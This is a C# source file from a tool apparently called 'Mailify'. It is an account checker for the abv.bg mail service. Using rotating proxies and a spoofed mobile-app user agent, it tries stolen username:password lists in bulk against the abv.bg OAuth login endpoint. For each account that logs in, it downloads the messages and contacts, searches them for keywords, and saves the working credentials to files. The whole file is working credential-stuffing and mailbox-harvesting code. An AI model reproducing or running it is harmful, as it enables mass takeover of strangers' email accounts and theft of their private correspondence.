using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;

namespace Mailify
{
    internal class Abv_Bg_Scan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    req.AllowAutoRedirect = false;
                    req.EnableEncodingContent = true;
                    var DEVICE_ID = Guid.NewGuid().ToString();
                    req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    req.AddHeader("Connection", "close");
                    req.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 10.0; samsung IA40C-OS Build/WPY54S)");
                    req.AddHeader("User-Agent", "passport.abv.bg");
                    var res0 = req.Post("https://passport.abv.bg/sc/oauth/token", $"password={credentials[1]}&captcha_challenge=&device_id={DEVICE_ID}&os=2&grant_type=nativeclient_password&app_id=59831019&client_id=abv-mobile-apps&username={credentials[0]}", "application/x-www-form-urlencoded");
                    string text0 = res0.ToString();

                    if (text0.Contains("\"access_token\":\"") || Convert.ToInt32(res0.StatusCode) == 200)
                    {
                        var ACCESS_TOKEN = Functions.JSON(text0, "access_token").FirstOrDefault();
                        req.AllowAutoRedirect = false;
                        req.EnableEncodingContent = true;
                        string details = req.Post("https://apis.abv.bg/mobile/sc/bootstrap", $"fid=&access_token={ACCESS_TOKEN}&settings=true&messages_filter=&folders=true&quotas=true&messages=true&foreign_profiles=true&contacts=true", "application/x-www-form-urlencoded").ToString();

                        foreach (string line in File.ReadAllLines("Files//Keywords.txt"))
                        {
                            int a = Regex.Matches(details, line).Count;
                            if (a == 0 )
                            {
                                Variables.Custom++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                }
                            }
                            else
                            {
                                Variables.Valid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    if (Config.kekr_UI == "LOG")
                                    {
                                        Console.WriteLine($"[+] " + combo + " | Keyword: " + line + " | Results: " + a, Color.Green);
                                    }
                                    File.AppendAllText(Variables.results + $"{line}.txt", combo + " | Keyword: " + line + " | Results: " + a + Environment.NewLine);
                                }
                            }
                        }
          

                    }
                    else if (text0.Contains("\"error\":\"unauthorized_user\"") || Convert.ToInt32(res0.StatusCode) == 401)
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}
